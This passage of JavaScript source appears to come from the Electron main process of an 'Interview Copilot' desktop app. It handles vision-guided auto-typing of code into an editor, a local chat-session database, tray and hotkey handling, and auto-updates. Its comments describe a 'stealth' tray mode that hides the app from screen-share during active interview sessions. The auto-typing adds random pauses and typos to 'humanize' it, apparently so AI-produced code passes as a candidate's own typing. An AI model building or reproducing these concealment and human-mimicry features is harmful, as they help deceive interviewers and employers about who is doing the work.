        // Brief "spotted a problem" pause — humanizes the surgical action.
        await autoTypeSleep(180 + Math.random() * 280);
        if (op.action === 'insert') {
          await autoTypeCharWithTypo(keyboard, Key, op.char, null);
        } else if (op.action === 'delete') {
          // We're at col `op.col` which is the position of the char to delete.
          // One Right + Backspace removes it. Or just Delete from current position.
          await autoTypePressWithDwell(keyboard, Key.Delete);
          await autoTypeNavSleep(14, 30);
        }
        applied++;
      } catch (e) {
        console.warn(`[auto-type] surgical bracket op failed:`, e && e.message);
      }
    }

    return { ok: true, repairs: applied, totalAttempted: sortedOps.length };
  } catch (e) {
    return { ok: false, reason: `exception:${e && e.message}` };
  }
}

async function autoTypeMultiOpRepair(originalCode, language, authToken, apiBase, ctx) {
  try {
    const shot = await captureScreenForVision();
    if (!shot || !shot.base64) {
      return { ok: false, reason: 'no_screenshot' };
    }
    const uia = await readFocusedViaUIA(1500);
    const editorText = (uia && uia.ok && typeof uia.text === 'string') ? uia.text : '';
    if (editorText.length === 0) {
      return { ok: false, reason: 'no_editor_text' };
    }

    const fetchUrl = `${apiBase}/api/v1/ai/autotype-vision`;
    let visRes;
    try {
      visRes = await fetch(fetchUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${authToken}`,
        },
        body: JSON.stringify({
          screenshotBase64: shot.base64,
          screenshotMediaType: shot.mediaType,
          code: originalCode,
          language,
          editorText,
        }),
      });
    } catch (netErr) {
      return { ok: false, reason: `network:${netErr && netErr.message}` };
    }

    if (!visRes.ok) {
      return { ok: false, reason: `vision_http_${visRes.status}` };
    }

    const repairPlan = await visRes.json().catch(() => null);
    if (!repairPlan || !repairPlan.ok || !Array.isArray(repairPlan.operations)) {
      return { ok: false, reason: 'no_repair_plan' };
    }

    if (repairPlan.operations.length === 0) {
      // Vision agrees: nothing more to fix. Editor matches target.
      return { ok: true, repairs: 0, reason: 'already_correct' };
    }

    // ── Cap 3: max 3 ops total ──
    if (repairPlan.operations.length > 3) {
      return { ok: false, reason: `too_many_repairs_${repairPlan.operations.length}` };
    }

    // ── Cap 4: confidence ≥0.78 ──
    if (typeof repairPlan.confidence !== 'number' || repairPlan.confidence < 0.78) {
      return { ok: false, reason: `repair_low_conf_${repairPlan.confidence}` };
    }

    // ── Completeness-aware caps (P5d v2) ──
    // The OLD caps here were "typo-only": per-op span ≤2 lines AND total
    // ≤150 chars. They let repair fix a stray bracket but made it REFUSE to
    // COMPLETE a chunk the first pass left half-written (a navigation miss, an
    // under-typed function body). That's the "finish what's actually left"
    // behavior we want — so the size caps are gone.
    //
    // The protection against the ORIGINAL regression — "re-selecting a chunk
    // that was already correct and re-typing it from the top" — was NEVER the
    // size cap. It's Cap 5 below (skip no-op rewrites) + the structural-line
    // filter + the content-loss guard, all enforced inside executeMultiOpPlan.
    // Those stay. We replace the size caps with two legible rails that map
    // directly to the user-reported symptom.
    //
    // Rail 1 — never type MORE than the intended solution. A "repair" that
    // emits more characters than CODE_TO_TYPE itself isn't a repair, it's a
    // rewrite. (+40 slack absorbs indentation / format drift.)
    const totalRepairChars = repairPlan.operations.reduce((sum, op) => sum + (op.text || '').length, 0);
    const targetChars = (originalCode || '').length;
    if (totalRepairChars > targetChars + 40) {
      return { ok: false, reason: `repair_exceeds_target_${totalRepairChars}v${targetChars}` };
    }

    // Rail 2 — refuse any single replace/delete that swallows (near-)the whole
    // document. "replace L1..end" is exactly the "start from the beginning and
    // rewrite everything" symptom the user reported. A chunk-sized op (one
    // function body inside a larger file) is fine — that's what completing a
    // leftover chunk looks like. Floor at 12 lines: in a tiny mostly-stub file
    // a near-full fill is legitimate and Cap 5 / content-loss guard cover it.
    const editorLineCount = Math.max(1, editorText.split('\n').length);
    if (editorLineCount >= 12) {
      for (const op of repairPlan.operations) {
        if (op.op === 'insert') continue;
        const span = (op.end_line || op.start_line) - op.start_line + 1;
        if (span >= editorLineCount * 0.9) {
          return { ok: false, reason: `repair_wholesale_refused_${span}of${editorLineCount}` };
        }
      }
    }

    // ── Cap 5: SKIP NO-OP REWRITES ──
    // Before executing each op, check what's actually at the target lines
    // RIGHT NOW. If the op's replacement text matches what's already there
    // (whitespace-tolerant), it's a no-op rewrite — skip it. This is what
    // produced the "re-typing the same chunk" regression.
    const editorLines = editorText.split('\n');
    const stripWs = (s) => s.replace(/\s+/g, '');
    const meaningfulOps = [];
    let noOpSkipped = 0;
    for (const op of repairPlan.operations) {
      if (op.op === 'replace' && op.text) {
        const startIdx = op.start_line - 1;
        const endIdx = op.end_line - 1;
        if (startIdx >= 0 && endIdx < editorLines.length) {
          const currentContent = editorLines.slice(startIdx, endIdx + 1).join('\n');
          if (stripWs(currentContent) === stripWs(op.text)) {
            console.log(`[auto-type] REPAIR: skipping no-op rewrite — L${op.start_line}-${op.end_line} already matches target (whitespace-tolerant)`);
            noOpSkipped++;
            continue;
          }
        }
      }
      meaningfulOps.push(op);
    }

    if (meaningfulOps.length === 0) {
      // All proposed repairs were no-op rewrites. Editor is correct.
      return { ok: true, repairs: 0, reason: `noop_rewrites_skipped_${noOpSkipped}` };
    }

    const opSummary = meaningfulOps
      .map(o => `${o.op}[L${o.start_line}${o.op !== 'insert' ? '-' + o.end_line : ''}]`)
      .join(', ');
    console.log(`[auto-type] REPAIR: ${meaningfulOps.length} surgical fix(es) at conf=${repairPlan.confidence}${noOpSkipped > 0 ? ` (skipped ${noOpSkipped} no-op rewrites)` : ''} — ${opSummary}`);

    // Re-use executeMultiOpPlan with the LATEST UIA text so the structural-
    // line filter still refuses any unsafe repair.
    const ctxWithLatestUIA = { ...ctx, uiaText: editorText };
    const result = await executeMultiOpPlan(meaningfulOps, ctxWithLatestUIA);
    return {
      ok: true,
      repairs: result.opCount,
      totalAttempted: meaningfulOps.length,
      noOpSkipped,
    };
  } catch (e) {
    return { ok: false, reason: `exception:${e && e.message}` };
  }
}

// Capability query for the renderer: tells App.tsx whether to skip the
// slow OCR pre-check (because UIA is available) or run it (fallback path).
ipcMain.handle('auto-type:capabilities', () => {
  return {
    hasA11y: process.platform === 'win32',
    platform: process.platform,
  };
});

// Debug-only: lets a developer poke the bridge from the renderer console.
ipcMain.handle('a11y:read-focused', async () => {
  return await readFocusedViaUIA(1500);
});

// ── Database IPC handlers ──
// All session operations require a userId so conversations never bleed
// between accounts on a shared device.

// Fan out an event to every window. Used so the conversation sidebar and
// the popout stay in sync without each renderer having to poll.
function broadcastToAllWindows(channel, ...args) {
  BrowserWindow.getAllWindows().forEach(win => {
    if (!win.isDestroyed()) win.webContents.send(channel, ...args);
  });
}

ipcMain.handle('db:claim-orphan-sessions', (_event, userId) => {
  return database.claimOrphanSessions(userId);
});

ipcMain.handle('db:get-active-session', (_event, userId) => {
  // Cache so the X-close / tray-Quit path can demote/delete-empty the
  // active session without a renderer roundtrip (renderer may be torn
  // down by the time we'd otherwise need to ask it). See endSessionCleanly.
  _maybeCacheUserId(userId);
  return database.getOrCreateActiveSession(userId);
});

ipcMain.handle('db:list-sessions', (_event, userId) => {
  return database.listSessionsForUser(userId);
});

// Conversations the phone wrote while this machine was off. The renderer
// fetches them (it holds the auth token); the main process owns the
// database, so the write happens here.
ipcMain.handle('db:known-session-ids', (_event, ids, userId) => {
  return database.knownSessionIds(ids, userId);
});

ipcMain.handle('db:import-remote-session', (_event, payload) => {
  const result = database.importRemoteSession(payload || {});
  // Only wake the sidebar when something actually landed — this runs on
  // a timer, and a broadcast per tick would re-render the session list
  // forever for no reason.
  if (result.ok && result.added > 0) broadcastToAllWindows('db:sessions-updated');
  return result;
});

ipcMain.handle('db:new-session', (_event, name, userId) => {
  const session = database.startNewSession(name, userId);
  broadcastToAllWindows('db:sessions-updated');
  broadcastToAllWindows('db:active-session-changed', session.id);
  return session;
});

ipcMain.handle('db:switch-session', (_event, sessionId, userId) => {
  const session = database.switchToSession(sessionId, userId);
  if (session) {
    broadcastToAllWindows('db:sessions-updated');
    broadcastToAllWindows('db:active-session-changed', session.id);
  }
  return session;
});

ipcMain.handle('db:rename-session', (_event, sessionId, userId, newName) => {
  const ok = database.renameSession(sessionId, userId, newName);
  if (ok) broadcastToAllWindows('db:sessions-updated');
  return ok;
});

ipcMain.handle('db:delete-session', (_event, sessionId, userId) => {
  const result = database.deleteSession(sessionId, userId);
  if (result.ok) {
    broadcastToAllWindows('db:sessions-updated');
    if (result.newActiveSession) {
      broadcastToAllWindows('db:active-session-changed', result.newActiveSession.id);
    }
  }
  return result;
});

// Per-session ops now require userId — verify ownership before any
// read/write so a renderer that guesses a sessionId (Date.now()-based)
// can't reach another user's data on a shared device. Renderer always
// passes userId from licenseService; callers without one (legacy) get
// an empty result rather than cross-user access.
ipcMain.handle('db:get-messages', (_event, sessionId, userId) => {
  return database.getMessages(sessionId, userId);
});

ipcMain.handle('db:add-message', (_event, sessionId, message, userId) => {
  const ok = database.addMessage(sessionId, message, userId);
  if (!ok) return { ok: false, reason: 'forbidden' };
  // Notify the OTHER window so it updates in real time
  BrowserWindow.getAllWindows().forEach(win => {
    if (win.webContents.id !== _event.sender.id && !win.isDestroyed()) {
      win.webContents.send('db:messages-updated', sessionId);
    }
  });
  // The first user message can trigger an auto-rename inside addMessage,
  // so always broadcast a sessions-updated so the sidebar re-fetches
  // (cheap — the full list is tiny).
  broadcastToAllWindows('db:sessions-updated');
  return { ok: true };
});

ipcMain.handle('db:get-context-files', (_event, sessionId, userId) => {
  return database.getContextFiles(sessionId, userId);
});

ipcMain.handle('db:add-context-file', (_event, sessionId, file, userId) => {
  const ok = database.addContextFile(sessionId, file, userId);
  if (!ok) return { ok: false, reason: 'forbidden' };
  BrowserWindow.getAllWindows().forEach(win => {
    if (win.webContents.id !== _event.sender.id && !win.isDestroyed()) {
      win.webContents.send('db:files-updated', sessionId);
    }
  });
  return { ok: true };
});

ipcMain.handle('db:remove-context-file', (_event, fileId, userId) => {
  const ok = database.removeContextFile(fileId, userId);
  if (!ok) return { ok: false, reason: 'forbidden' };
  BrowserWindow.getAllWindows().forEach(win => {
    if (win.webContents.id !== _event.sender.id && !win.isDestroyed()) {
      win.webContents.send('db:files-updated');
    }
  });
  return { ok: true };
});

ipcMain.handle('db:clear-session', (_event, sessionId, userId) => {
  const okMsgs = database.clearMessages(sessionId, userId);
  const okFiles = database.clearContextFiles(sessionId, userId);
  if (!okMsgs && !okFiles) return { ok: false, reason: 'forbidden' };
  broadcastToAllWindows('db:session-cleared', sessionId);
  broadcastToAllWindows('db:sessions-updated');
  return { ok: true };
});

// ───────────────────────────────────────────────
//  SYSTEM TRAY
// ───────────────────────────────────────────────
// 1×1 fully-transparent PNG. Used only during active interview sessions
// where stealth must override discoverability — see the session-active
// handler. Outside of sessions we now use the real brand icon so users
// can actually find and click the tray slot (this was the #1 source of
// "I can't reopen the app" support reports).
const TRANSPARENT_PNG_B64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';

function loadTrayIcon(stealth) {
  if (stealth) {
    const img = nativeImage.createFromBuffer(Buffer.from(TRANSPARENT_PNG_B64, 'base64'));
    return img.resize({ width: 16, height: 16 });
  }
  // Real brand icon. electron/tray-icon.png (32×32) ships inside app.asar
  // alongside main.cjs (electron/**/* is in package.json files glob).
  // Electron auto-scales for HiDPI displays.
  const iconPath = path.join(__dirname, 'tray-icon.png');
  try {
    const img = nativeImage.createFromPath(iconPath);
    if (img.isEmpty()) throw new Error('nativeImage.createFromPath returned empty');
    return img;
  } catch (err) {
    electronLog.warn('[tray] failed to load brand icon, falling back to transparent:', err.message);
    const img = nativeImage.createFromBuffer(Buffer.from(TRANSPARENT_PNG_B64, 'base64'));
    return img.resize({ width: 16, height: 16 });
  }
}

function createTray(stealth = false) {
  // Two visual modes:
  //   stealth=false (default, idle state): real brand icon + "Interview Copilot"
  //     tooltip. Users can see and click the tray slot like a normal app.
  //   stealth=true (active interview session): 1×1 transparent icon + blank
  //     tooltip. Slot still exists for right-click access but no graphic or
  //     branding draws on the screen-share. We additionally destroy the tray
  //     entirely on session-active=true (see ipcMain handler) — stealth=true
  //     here is a defense-in-depth fallback for any path that re-creates
  //     during a session.
  const trayIcon = loadTrayIcon(stealth);

  // Tray() can throw on Windows if the shell tray isn't ready (Explorer.exe
  // mid-restart) or if the icon handle is rejected. Retry once after a brief
  // delay rather than leaving the user with no way back into the app.
  try {
    tray = new Tray(trayIcon);
  } catch (err) {
    electronLog.warn('[tray] new Tray() threw, retrying in 500ms:', err.message);
    tray = null;
    setTimeout(() => {
      try {
        tray = new Tray(loadTrayIcon(stealth));
        wireTrayHandlers(stealth);
        electronLog.info('[tray] retry succeeded');
      } catch (err2) {
        electronLog.error('[tray] retry also failed, giving up this cycle:', err2.message);
      }
    }, 500);
    return;
  }

  wireTrayHandlers(stealth);
}

function wireTrayHandlers(stealth) {
  if (!tray || tray.isDestroyed()) return;
  // Tooltip: branded when visible (helps users identify the slot they're
  // hovering); single-space when stealth (non-empty so Windows doesn't
  // garbage-collect the slot, but no branding to leak on screen-share).
  tray.setToolTip(stealth ? ' ' : 'Interview Copilot');

  function updateTrayMenu() {
    // Defense-in-depth — the session-active handler clears trayMenuInterval
    // before destroying the tray, but a still-pending tick from before that
    // clearInterval() call could still land here after `tray = null`.
    if (!tray || tray.isDestroyed()) return;
    const isMainVisible = mainWindow && !mainWindow.isDestroyed() && mainWindow.isVisible();
    const isPopoutOpen = popoutWindow && !popoutWindow.isDestroyed();
    // Display-only accelerator hint — the actual hotkey is registered
    // via globalShortcut.register() in app.whenReady. We inline it in
    // the label (rather than using Menu's `accelerator` property) to
    // avoid a second binding that could double-fire with the global one.
    const accelHint = process.platform === 'darwin' ? 'Cmd+Alt+Space' : 'Ctrl+Alt+Space';

    const contextMenu = Menu.buildFromTemplate([
      {
        label: 'Interview Copilot',
        enabled: false,
      },
      { type: 'separator' },
      {
        label: isMainVisible ? `Hide Main Window  (${accelHint})` : `Show Main Window  (${accelHint})`,
        click: () => {
          if (!mainWindow || mainWindow.isDestroyed()) {
            createMainWindow();
          } else if (mainWindow.isVisible()) {
            smoothHide(mainWindow);
          } else {
            smoothShow(mainWindow);
          }
          updateTrayMenu();
        }
      },
      {
        label: isPopoutOpen ? 'Close Pop-out' : 'Open Pop-out',
        click: () => {
          if (isPopoutOpen) {
            popoutWindow.close();
          } else {
            createPopoutWindow();
          }
          setTimeout(updateTrayMenu, 200);
        }
      },
      { type: 'separator' },
      {
        label: 'Quit',
        click: () => {
          // Quit is the deliberate "I'm really done" signal — always
          // clean up regardless of popout state (X respects popout,
          // Quit does not). Runs synchronously: DB demote/delete is
          // sync SQLite, and we fire-and-forget cmd-end-session at the
          // renderer (mic/Auto state matters in-memory only; mic dies
          // with the process and Auto resets to false on next boot).
          // Done BEFORE app.quit() so the DB write completes well
          // before before-quit closes the SQLite handle.
          endSessionCleanly();
          // Tray-Quit race fix: if there's NO pending update, mark
          // isQuitting=true now so mainWindow.on('close') (which fires as
          // part of app.quit()'s window-close cascade) takes its
          // early-return branch instead of showing the in-app update
          // prompt or hiding to tray. When a pending update DOES exist,
          // leave isQuitting=false so the close handler hits the update-
          // prompt branch and offers the install — matches the X-button
          // behavior, which the user expects.
          if (!pendingUpdate) app.isQuitting = true;
          app.quit();
        }
      }
    ]);

    tray.setContextMenu(contextMenu);
  }

  // Left-click on tray: toggle main window with smooth animation
  tray.on('click', () => {
    if (!mainWindow || mainWindow.isDestroyed()) {
      createMainWindow();
    } else if (mainWindow.isVisible()) {
      smoothHide(mainWindow);
    } else {
      smoothShow(mainWindow);
    }
    updateTrayMenu();
  });

  // Update menu whenever windows change
  updateTrayMenu();

  // Re-build menu periodically to reflect window state changes. Clear any
  // prior interval first — createTray() runs again on session-end, and
  // without this clear we'd stack a fresh interval each time, leaking
  // closures and multiplying the work the tick has to do.
  if (trayMenuInterval) clearInterval(trayMenuInterval);
  trayMenuInterval = setInterval(updateTrayMenu, 3000);
}

// ───────────────────────────────────────────────
//  APP LIFECYCLE
// ───────────────────────────────────────────────
app.isQuitting = false;

app.whenReady().then(() => {
  // Bail out if we lost the single-instance lock — a secondary instance can
  // momentarily reach whenReady before app.quit() settles. Without this guard
  // it would briefly create a window, register a tray, and start a second
  // updater check, all of which then fight the primary instance.
  if (!app.hasSingleInstanceLock()) return;

  // Resolve which API server main.cjs talks to. Fire-and-forget: the
  // ~1.2s probe finishes long before the user can trigger an auto-type
  // (window paint + navigate + click a code block + 3s countdown). In
  // dev with a local server up, this redirects API_BASE to localhost so
  // server-side route changes are actually exercised.
  resolveDevApiBase();

  // AppUserModelId — without this, Windows toast notifications either
  // show under "electron.app.Interview Copilot" or fail to display at
  // all. Must match the appId in package.json's electron-builder config
  // so notifications are routed to the same registered shortcut the
  // installer created.
  if (process.platform === 'win32') {
    try { app.setAppUserModelId('com.interviewcopilot.app'); } catch (_) {}
  }

  // ── Permission handlers — allowlist by (permission, origin) ──────
  // The previous blanket-grant handlers were defense-in-depth gaps:
  // setPermissionRequestHandler((wc, perm, cb) => cb(true)) said "yes
  // to anything for any origin." Today the renderer only loads our own
  // file:// or localhost:3005 URL, so there's no exploit surface — but
  // any future code that loads a third-party origin (Google sign-in
  // popup, embedded webview) would silently inherit carte-blanche.
  // Scope down now while it's a one-line change.
  //
  // Allowed permissions cover what the app actually uses:
  //   media        — microphone (Deepgram transcription)
  //   display-capture / screen-wake-lock — screen capture for Auto-Solve
  //   notifications — first-time-tray-hide toast
  //   clipboard-read / clipboard-sanitized-write — Copy buttons
  // Anything else (geolocation, midi, sensors, persistent-storage,
  // payment-handler, fullscreen, etc.) is denied.
  const ALLOWED_PERMISSIONS = new Set([
    'media',
    'display-capture',
    'screen-wake-lock',
    'notifications',
    'clipboard-read',
    'clipboard-sanitized-write',
  ]);
  function isAppOrigin(webContents) {
    if (!webContents || webContents.isDestroyed()) return false;
    const url = webContents.getURL();
    if (!url) return false;
    if (isDev) {
      return url.startsWith('http://localhost:3005') || url.startsWith('http://127.0.0.1:3005');
    }
    return url.startsWith('file://');
  }
  session.defaultSession.setPermissionRequestHandler((webContents, permission, callback) => {
    if (!ALLOWED_PERMISSIONS.has(permission)) {
      electronLog.warn(`[permissions] denied ${permission} from ${webContents?.getURL?.()}`);
      return callback(false);
    }
    if (!isAppOrigin(webContents)) {
      electronLog.warn(`[permissions] denied ${permission} — non-app origin: ${webContents?.getURL?.()}`);
      return callback(false);
    }
    callback(true);
  });
  session.defaultSession.setPermissionCheckHandler((webContents, permission) => {
    if (!ALLOWED_PERMISSIONS.has(permission)) return false;
    return isAppOrigin(webContents);
  });

  // Pre-warm the Windows UIA bridge so the first Auto-Type doesn't pay the
  // 300ms–2s PowerShell + `Add-Type System.Windows.Automation` cold start.
  // By the time the user has loaded the Vite UI and hit Auto-Type, the
  // bridge has typically been READY for several seconds.
  if (process.platform === 'win32') {
    try {
      startUIABridge();
      console.log('[auto-type] UIA bridge pre-warming in background');
    } catch (e) {
      console.warn('[auto-type] UIA bridge pre-warm failed:', e && e.message);
    }
  }

  // Pre-warm nut-js on macOS. Native binding load is the same on every
  // platform but on Mac it carries an extra ~500ms–1s of cost from
  // CoreGraphics initialization that the user otherwise pays at
  // first-Auto-Type-click. There's no UIA bridge equivalent on Mac (UIA
  // is win32-only — see `auto-type:capabilities`), so the AI planner
  // tier always fires regardless. Pre-warming `loadNut` doesn't trigger
  // the Accessibility permission prompt (that's deferred until the
  // first keyboard/mouse call); it just gets the native module loaded
  // into memory so the synchronous keystrokes-per-character path runs
  // at warm latency from the first user interaction. No-op on Win/Linux
  // — Win has its own pre-warm above, Linux pays the load lazily and
  // there's no way to grant Linux the equivalent of macOS Accessibility
  // pre-grant.
  if (process.platform === 'darwin') {
    try {
      loadNut();
      console.log('[auto-type] nut-js pre-warmed (mac)');
    } catch (e) {
      // Don't crash the whole app if nut-js fails to load — the
      // user-facing Auto-Type click will surface the error with a
      // clear message via the existing auto-type:check-permission
      // handler. Just log here.
      console.warn('[auto-type] nut-js pre-warm failed (mac):', e && e.message);
    }
  }

  // ── Downgrade self-heal high-water mark ──────────────────────────
  // 2026-07-18 field forensics: a stale 3.4.9 installer (old download,
  // double-clicked) executed on a user machine and silently downgraded a
  // 4.0.13 install. Old installer artifacts predate the 4.0.12 downgrade
  // guard and can never be retrofitted — the app itself is the only
  // surviving layer. So: record the highest version this PROFILE has
  // ever run in userData (installers never touch it); if we ever boot
  // BELOW that mark, treat it as a resurrection — log loudly, hold the
  // boot window, and force an immediate update-check + auto-install so
  // the machine heals to latest in about a minute with zero user action.
  // Fail-open at every step: any IO error just disables the heuristic.
  let selfHealDowngrade = false;
  try {
    const fsHw = require('fs');
    const hwPath = require('path').join(app.getPath('userData'), 'version-highwater.json');
    const curVer = app.getVersion();
    const cmpVer = (a, b) => {
      const pa = String(a || '').split('.').map((n) => parseInt(n, 10) || 0);
      const pb = String(b || '').split('.').map((n) => parseInt(n, 10) || 0);
      for (let i = 0; i < 3; i++) { if ((pa[i] || 0) !== (pb[i] || 0)) return (pa[i] || 0) - (pb[i] || 0); }
      return 0;
    };
    let highWater = null;
    try { highWater = JSON.parse(fsHw.readFileSync(hwPath, 'utf8')).version || null; } catch { /* first run */ }
    if (highWater && cmpVer(curVer, highWater) < 0) {
      selfHealDowngrade = true;
      electronLog.error(`[self-heal] running ${curVer} but this profile has run ${highWater} — a stale installer downgraded the app; forcing update to latest`);
    }
    if (!highWater || cmpVer(curVer, highWater) > 0) {
      try { fsHw.writeFileSync(hwPath, JSON.stringify({ version: curVer, at: new Date().toISOString() })); } catch { /* non-fatal */ }
    }
  } catch (e) { /* fail-open */ }

  // ── Launch-blink gate (Windows) ──────────────────────────────────
  // If the previous session ended without installing a downloaded update
  // (crash / force-kill skipped the quit-time install), the old flow
  // painted the OLD app first, then the launch window installed the
  // cached update and relaunched — a jarring old-version "blink". When
  // (and only when) a pending package exists, hold the window back so
  // the cached install applies BEFORE any UI paints; the relaunch then
  // opens straight on the new version. Every normal launch (empty
  // cache) shows the window immediately, exactly as before. Fail-open
  // by design: a stale/refused cache, an updater error, a no-update
  // result, and a hard 6s cap all fall through to showing the window.
  let bootWindowShown = false;
  function showBootWindow() {
    if (bootWindowShown) return;
    bootWindowShown = true;
    if (!mainWindow || mainWindow.isDestroyed()) createMainWindow();
  }
  let holdForPendingUpdate = false;
  if (!isDev && process.platform === 'win32') {
    try {
      const fsBoot = require('fs');
      const pendingDir = require('path').join(process.env.LOCALAPPDATA || '', 'interview-copilot-ai-updater', 'pending');
      holdForPendingUpdate =
        !!process.env.LOCALAPPDATA &&
        fsBoot.existsSync(pendingDir) &&
        fsBoot.readdirSync(pendingDir).some((f) => f.toLowerCase().endsWith('.exe'));
    } catch (e) {
      holdForPendingUpdate = false;
    }
  }
  if (holdForPendingUpdate || selfHealDowngrade) {
    electronLog.info(`[updater] holding window at boot (pending=${holdForPendingUpdate} selfHeal=${selfHealDowngrade})`);
    setTimeout(showBootWindow, 6000);
  } else {
    showBootWindow();
  }
  createTray();

  // ── Tray reliability watchdog ───────────────────────────────────────
  // The tray icon dies in a few real-world scenarios that we shouldn't
  // make the user troubleshoot:
  //   • Explorer.exe restart (Task Manager → Restart Windows Explorer,
  //     or a shell crash). Electron's auto-recovery isn't reliable on
  //     all Windows builds — verify and recreate ourselves.
  //   • Display config changes (plug/unplug monitor, resolution change,
  //     DPI change). The system tray shell is recreated; our handle to
  //     the old tray slot can go stale.
  //   • Random "tray = null" left by a failed createTray() retry.
  //
  // Strategy: recreate ONLY when not in an active interview session
  // (sessionActive guards screen-share invisibility). Every 60s and on
  // every display-config event.
  function reviveTrayIfDead(reason) {
    if (sessionActive) return; // session-active intentionally has no tray
    if (tray && !tray.isDestroyed()) return;
    electronLog.info(`[tray] watchdog reviving — reason: ${reason}`);
    try { createTray(); } catch (err) {
      electronLog.warn('[tray] watchdog createTray threw:', err && err.message);
    }
  }
  try {
    screen.on('display-added', () => reviveTrayIfDead('display-added'));
    screen.on('display-removed', () => reviveTrayIfDead('display-removed'));
    screen.on('display-metrics-changed', () => reviveTrayIfDead('display-metrics-changed'));
  } catch (err) {
    electronLog.warn('[tray] screen event subscription failed:', err && err.message);
  }
  setInterval(() => reviveTrayIfDead('periodic-health-check'), 60_000);

  // ── Global hotkey: bring the app back when it's hidden ──────────────
  // The app window has skipTaskbar=true and the tray icon is sometimes
  // genuinely lost (Explorer.exe restart, Windows 11 overflow flyout
  // disabled, display-config change). Without this hotkey, a user with
  // the window hidden and a missing tray slot has no way back into the
  // app short of relaunching from the Start menu. Ctrl+Alt+Space is
  // chosen because it is rarely bound (vs Ctrl+Shift+Space which IDEs
  // use for parameter hints / smart completion) and is a 3-key chord
  // that's hard to trigger by accident during typing.
  //
  // Registration can fail if another app already grabbed the chord —
  // electronLog so we surface it in the support log without crashing.
  const TOGGLE_ACCELERATOR = process.platform === 'darwin' ? 'Cmd+Alt+Space' : 'Ctrl+Alt+Space';
  try {
    const ok = globalShortcut.register(TOGGLE_ACCELERATOR, () => {
      if (!mainWindow || mainWindow.isDestroyed()) {
        createMainWindow();
        return;
      }
      if (mainWindow.isVisible() && mainWindow.isFocused()) {
        // Visible AND focused — user is actively using it; this press
        // is a request to hide. Same semantics as the close button.
        try { mainWindow.webContents.send('app-hidden-to-tray'); } catch {}
        smoothHide(mainWindow);
      } else {
        // Hidden, minimized, or visible-but-not-focused — bring forward
        // with the fade-in that smoothShow does (handles restore from
        // minimized internally).
        smoothShow(mainWindow);
      }
    });
    if (!ok) {
      electronLog.warn(`[hotkey] register("${TOGGLE_ACCELERATOR}") returned false — likely already bound by another app`);
    } else {
      electronLog.info(`[hotkey] registered ${TOGGLE_ACCELERATOR}`);
    }
  } catch (err) {
    electronLog.warn('[hotkey] registration threw:', err && err.message);
  }

  // ── Auto-Update System ──
  // Strategy: at launch, race against a 6s window — if a previously
  // downloaded update is sitting in the cache, electron-updater fires
  // `update-downloaded` almost immediately (no network download needed),
  // and we install it silently before the user can do anything else. The
  // user just sees the app open briefly, then re-open on the new version.
  // Outside the launch window, normal flow: detect → download → renderer
  // shows "Restart & Update" prompt. Plus belt-and-suspenders install on
  // quit + on X-close so a download never gets stranded in the cache.
  if (!isDev) {
    try {
      const { autoUpdater } = require('electron-updater');

      // electronLog is initialized at module top; hand it to electron-updater
      // so download/install events land in the same main.log as the rest of
      // the app (under %AppData%\interview-copilot-ai\logs\ on Windows or
      // ~/Library/Logs/Interview Copilot/ on macOS).
      autoUpdater.logger = electronLog;

      autoUpdater.autoDownload = true;
      // We own the quit-time install ourselves via the before-quit hook and
      // the tray Quit handler. electron-updater's built-in autoInstallOnAppQuit
      // registers a second app.once('quit') → quitAndInstall(true) handler
      // that races ours — on slow teardowns one can fire while the other is
      // mid-operation, and both pass isSilent=true which doesn't hold the
      // installer alive long enough to replace locked files. Keep this false
      // so there is exactly one install owner at quit.
      autoUpdater.autoInstallOnAppQuit = false;

      // We ship full NSIS installers only — never the nsis-web target. With
      // this unset, electron-updater's web-installer machinery stays armed
      // and its cache pathway (installer.exe in the updater dir) is exactly
      // where the 2026-07-18 stale-3.4.9-downgrade landmine lived. Disable
      // the whole class; the 4.0.12+ installer also purges those artifacts.
      autoUpdater.disableWebInstaller = true;

      // ── Force FULL downloads — no differential/blockmap ──
      // Differential downloads reconstruct the new installer locally from a
      // cached baseline + a downloaded .blockmap. When that reconstruction
      // fails its sha512 check (common across an NSIS rebuild, a re-sign, or
      // any non-byte-identical republish) electron-updater silently re-downloads
      // the FULL file — that is the "it downloads 2 times" users report. Worse,
      // a subtly-corrupt reconstruction can yield an installer that RUNS but
      // doesn't cleanly replace the on-disk binary, so the next launch is still
      // the old version → the "opens old, installs, reopens new, every launch"
      // loop. Full downloads are larger but byte-exact and deterministic, and
      // they make the on-disk install reliable. Applies to Windows NSIS, macOS
      // zip, and Linux AppImage alike. (2026-06 update-loop fix.)
      autoUpdater.disableDifferentialDownload = true;

      function sendUpdateStatus(status, info) {
        const payload = { status, ...info };
        BrowserWindow.getAllWindows().forEach((win) => {
          if (!win.isDestroyed()) win.webContents.send('update-status', payload);
        });
      }

      // Hand off to the installer. quitAndInstall() internally calls
      // app.quit(), which re-enters before-quit — so we set isQuitting
      // first to skip the X-close dialog, and clear pendingUpdate so
      // the before-quit hook doesn't try to install a second time.
      function performInstall(isSilent) {
        if (app.isQuitting) return;
        const target = pendingUpdate;
        pendingUpdate = null;
        installPendingUpdate = null;
        app.isQuitting = true;
        const proceed = () => {
          try {
            electronLog.info(`[updater] installing ${target && target.version} silent=${isSilent}`);
            autoUpdater.quitAndInstall(isSilent, true);
          } catch (err) {
            electronLog.error('[updater] quitAndInstall threw:', err && err.message);
            app.quit();
          }
        };
        // Mac equivalent of the NSIS oneClick progress dialog. The MacUpdater
        // ditto-swap is silent at the OS level, so without this the user sees
        // the window vanish with no signal that an update is being applied —
        // looks like a crash. Show the modal, hold for ~1.5s (matches the
        // ~1s visible NSIS window on Windows), then let MacUpdater take over.
        // isSilent=true callers (none today, but reserved) skip the modal so
        // a future "background update at midnight" path can stay invisible.
        if (process.platform === 'darwin' && !isSilent) {
          showMacInstallerModal({ version: target && target.version })
            .catch((err) => electronLog.warn('[updater] installer modal failed:', err && err.message))
            .finally(() => setTimeout(proceed, 1500));
        } else {
          proceed();
        }
      }

      // Semver-lite comparator for x.y.z. Returns negative if a<b, 0 if a===b,
      // positive if a>b. Used to detect stale or regression installers sitting
      // in electron-updater's cache — firing `update-downloaded` for a version
      // we're already on (or older) would loop the install-on-quit.
      function compareAppVersions(a, b) {
        const pa = String(a || '').split('.').map((n) => parseInt(n, 10) || 0);
